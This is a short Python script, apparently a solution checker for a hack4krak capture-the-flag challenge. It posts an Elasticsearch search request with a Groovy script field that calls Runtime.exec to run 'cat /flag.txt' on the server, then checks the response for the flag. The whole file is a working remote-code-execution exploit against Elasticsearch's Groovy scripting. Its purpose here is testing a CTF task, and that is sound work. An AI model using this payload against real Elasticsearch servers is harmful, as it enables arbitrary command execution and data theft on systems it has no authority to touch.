import os
import sys

import requests

url = os.getenv("TASKS_DEPLOYMENT_URL", "http://localhost:8000")
headers = {"Host": "logs-aint-logging.hack4krak.pl", "Content-Type": "application/json"}

data = {
    "size": 1,
    "query": {"match_all": {}},
    "script_fields": {
        "test": {
            "lang": "groovy",
            "script": 'java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("cat /flag.txt").getText()',
        }
    },
}

response = requests.post(f"{url}/_search?pretty", headers=headers, json=data)
if response.status_code != 200:
    sys.exit(f"Unexpected status code: {response.status_code}")
if "hack4KrakCTF{" in response.text:
    print("  ✅ Flag is present (expected).")
else:
    sys.exit("  ❌ Flag is NOT present (unexpected).")
